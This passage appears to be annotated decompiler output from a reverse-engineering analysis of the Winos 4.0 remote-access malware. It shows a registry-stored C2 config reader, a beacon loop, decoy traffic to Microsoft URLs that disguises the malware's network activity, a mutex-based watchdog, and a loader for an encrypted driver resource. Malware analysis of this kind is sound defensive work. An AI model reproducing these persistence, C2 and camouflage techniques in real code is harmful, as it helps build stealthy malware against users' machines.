      pWVar5 = (LPWSTR)std::error_condition::value((error_condition *)(unaff_EBP + -0x98));
      BVar4 = CreateProcessW((LPCWSTR)0x0,pWVar5,p_Var10,p_Var11,BVar4,DVar3,pvVar12,pWVar13,p_Var14
                             ,p_Var16);
      if (BVar4 != 0) {
        DVar3 = WaitForSingleObject(*(HANDLE *)(unaff_EBP + -0x2c),300000);
        if (DVar3 == 0) {
          *(undefined4 *)(unaff_EBP + -0x40) = 1;
        }
        CloseHandle(*(HANDLE *)(unaff_EBP + -0x2c));
        CloseHandle(*(HANDLE *)(unaff_EBP + -0x28));
      }
      *(undefined1 *)(unaff_EBP + -4) = 3;
      FUN_1000a630((int *)(unaff_EBP + -0x98));
      *(undefined1 *)(unaff_EBP + -4) = 2;
      FUN_1000a630((int *)(unaff_EBP + -0x9c));
      *(undefined1 *)(unaff_EBP + -4) = 1;
      FUN_1000a630((int *)(unaff_EBP + -0xa0));
    }
    if (*(int *)(unaff_EBP + -0x40) == 0) {
      *(int *)(unaff_EBP + -0x54) = *(int *)(unaff_EBP + -0x54) + 1;
    }
  } while( true );
}

// ===== config_reader @ 0x1000c830: Reads Winos 4.0 config from HKCU\Console\IpDate =====
undefined4 __cdecl config_reader(int param_1)

{
  LSTATUS LVar1;
  DWORD local_10;
  HKEY local_c;
  DWORD local_8;
  
  local_c = (HKEY)0x0;
  local_10 = 3;
  local_8 = 0;
  LVar1 = RegOpenKeyExW((HKEY)0x80000001,L"Console",0,0x20019,&local_c);
  if (LVar1 == 0) {
    RegQueryValueExW(local_c,L"IpDate",(LPDWORD)0x0,&local_10,(LPBYTE)0x0,&local_8);
  }
  if (10 < local_8) {
    _memset(&lpData_101f7ec0,0,0x1000);
    RegQueryValueExW(local_c,L"IpDate",(LPDWORD)0x0,&local_10,(LPBYTE)&lpData_101f7ec0,&local_8);
    FUN_1000d010((wchar_t *)&lpData_101f7ec0,L"fz:",param_1 + 0x754,(undefined4 *)0x0);
    FUN_1000d010((wchar_t *)&lpData_101f7ec0,L"t3:",0,(undefined4 *)(param_1 + 0x6d8));
    FUN_1000d010((wchar_t *)&lpData_101f7ec0,L"o3:",param_1 + 0x69a,(undefined4 *)0x0);
    FUN_1000d010((wchar_t *)&lpData_101f7ec0,L"p3:",param_1 + 0x49c,(undefined4 *)0x0);
    FUN_1000d010((wchar_t *)&lpData_101f7ec0,L"bb:",param_1 + 0x7b8,(undefined4 *)0x0);
    FUN_1000d010((wchar_t *)&lpData_101f7ec0,L"o2:",param_1 + 0x45a,(undefined4 *)0x0);
    FUN_1000d010((wchar_t *)&lpData_101f7ec0,L"t2:",0,(undefined4 *)(param_1 + 0x498));
    FUN_1000d010((wchar_t *)&lpData_101f7ec0,L"S2:",param_1 + 0x25c,(undefined4 *)0x0);
    FUN_1000d010((wchar_t *)&lpData_101f7ec0,L"bz:",param_1 + 0x81c,(undefined4 *)0x0);
    FUN_1000d010((wchar_t *)&lpData_101f7ec0,L"A1:",param_1 + 0x1e,(undefined4 *)0x0);
    FUN_1000d010((wchar_t *)&lpData_101f7ec0,L"o1:",param_1 + 0x21c,(undefined4 *)0x0);
    FUN_1000d010((wchar_t *)&lpData_101f7ec0,L"t1:",0,(undefined4 *)(param_1 + 600));
  }
  return 1;
}

// ===== beacon @ 0x1000caf0: C2 connect loop with configured delay and interval =====
undefined4 beacon(void)

{
  long lVar1;
  wchar_t local_448;
  undefined1 local_446 [518];
  wchar_t local_240;
  undefined1 local_23e [518];
  undefined4 *local_38;
  undefined4 *local_34;
  undefined4 *local_30;
  undefined4 *local_2c;
  int *local_28;
  undefined4 *local_24;
  undefined4 *local_20;
  undefined4 *local_1c;
  undefined4 *local_18;
  int local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1017ecd1;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  lVar1 = __wtol((wchar_t *)&DAT_101f959c);
  Sleep(lVar1 * 1000);
  local_28 = (int *)0x0;
  local_18 = (undefined4 *)FUN_1001f056(0x68);
  local_8 = 0;
  if (local_18 == (undefined4 *)0x0) {
    local_1c = (undefined4 *)0x0;
  }
  else {
    local_1c = FUN_10005ad0(local_18);
  }
  local_2c = local_1c;
  local_8 = 0xffffffff;
  local_38 = local_1c;
  local_20 = (undefined4 *)FUN_1001f056(0x270);
  local_8 = 1;
  if (local_20 == (undefined4 *)0x0) {
    local_24 = (undefined4 *)0x0;
  }
  else {
    local_24 = FUN_1000a170(local_20);
  }
  local_30 = local_24;
  local_8 = 0xffffffff;
  local_34 = local_24;
  local_448 = L'\0';
  _memset(local_446,0,0x206);
  local_240 = L'\0';
  _memset(local_23e,0,0x206);
  local_14 = 0;
  FUN_1000db70(&DAT_101fa160,&local_448,&local_240,&local_14,(int *)&DAT_101fa164);
  local_28 = (int *)FUN_1000c780(local_38,local_34,local_14);
  do {
    FUN_1000db70(&DAT_101fa160,&local_448,&local_240,&local_14,(int *)&DAT_101fa164);
    FUN_1000d5f0(local_28,&local_448,&local_240);
    lVar1 = __wtol((wchar_t *)&DAT_101f95d8);
    Sleep(lVar1 * 0x3e9);
  } while( true );
}

// ===== Fake_traffic_thread @ 0x1000cd50: Decoy Microsoft Edge / telemetry requests every 30 s =====
undefined4 Fake_traffic_thread(void)

{
  __time64_t _Var1;
  int local_24;
  void *local_20;
  void *local_1c;
  CStringT<> local_18 [7];
  undefined1 local_11;
  void *local_10;
  undefined1 *puStack_c;
  int local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1017ecf0;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  _Var1 = FUN_1001cad0((__time64_t *)0x0);
  FUN_10152357((int)_Var1);
  local_11 = 0;
  do {
    ATL::CStringT<>::CStringT<>
              ((CStringT<> *)&stack0xffffffc8,
               (char *)
               L"https://www.microsoft.com/edge/launch/api/i18n/39578083/zh-cn/messages.json");
    FUN_1000d1b0();
    Sleep(30000);
    ATL::CStringT<>::CStringT<>(local_18,"");
    local_8 = 0;
    local_20 = FUN_1000fdd0(&local_24,0xc);
    local_8._0_1_ = 1;
    local_1c = local_20;
    FUN_1000adc0(local_18,
                 L"https://browser.events.data.microsoft.com/OneCollector/1.0/?cors=true&content-type=application/x-json-stream&ext.intweb.msfpc=1%s"
                );
    local_8 = (uint)local_8._1_3_ << 8;
    FUN_1000a630(&local_24);
    FUN_10009ec0(&stack0xffffffc8,(int *)local_18);
    FUN_1000d1b0();
    Sleep(30000);
    local_8 = 0xffffffff;
    FUN_1000a630((int *)local_18);
  } while( true );
}

// ===== watchdog @ 0x1000ce50: 8 s delay, single-instance mutex, relaunch partner every 20 s =====
undefined4 watchdog(void)

{
  DWORD DVar1;
  WCHAR local_524;
  undefined1 local_522 [518];
  WCHAR local_31c;
  undefined1 local_31a [518];
  wchar_t local_114;
  undefined1 local_112 [254];
  HANDLE local_14;
  HANDLE local_10;
  int local_c;
  HANDLE local_8;
  
  Sleep(8000);
  SetLastError(0);
  local_14 = CreateMutexW((LPSECURITY_ATTRIBUTES)0x0,0,u_0FBA498777699D14430F02F14CDD671A_101ef000);
  DVar1 = GetLastError();
  if (DVar1 == 0xb7) {
    FUN_10152320(0);
  }
  local_8 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,beacon,(LPVOID)0x0,0,(LPDWORD)0x0);
  if (local_8 != (HANDLE)0x0) {
    CloseHandle(local_8);
  }
  local_524 = L'\0';
  _memset(local_522,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,&local_524,0x104);
  local_31c = L'\0';
  _memset(local_31a,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,&local_31c,0x104);
  local_c = FUN_1000dca0((undefined1 (*) [16])&local_31c,0x5c);
  if (local_c != 0) {
    *(undefined2 *)(local_c + 2) = 0;
  }
  FID_conflict__swprintf(&local_31c,(wchar_t *)0x104,L"%s%s.dll",&local_31c,&DAT_101922bc);
  local_114 = L'\0';
  _memset(local_112,0,0xfe);
  FUN_1014b592(&local_114,0x80,u_0FBA498777699D14430F02F14CDD671A_101ef000,0x13);
  do {
    local_10 = OpenMutexW(0x1f0001,0,&local_114);
    if (local_10 == (HANDLE)0x0) {
      DVar1 = GetLastError();
      if (DVar1 == 2) {
        thunk_FUN_10266727();
      }
    }
    else {
      CloseHandle(local_10);
    }
    Sleep(20000);
  } while( true );
}

// ===== driver_resource @ 0x1022d331: Loads resource 0x418 "SettingsDatabase" (encrypted ardrv.sys) =====
void driver_resource(void)

{
  HRSRC pHVar1;
  int unaff_EBP;
  bool in_ZF;
  
  if (in_ZF) {
    pHVar1 = FindResourceW(*(HMODULE *)(unaff_EBP + -0x10),(LPCWSTR)0x418,L"SettingsDatabase");
    *(HRSRC *)(unaff_EBP + -8) = pHVar1;
    FUN_1032962b();
    return;
  }
  FUN_1021764f();
  return;
}
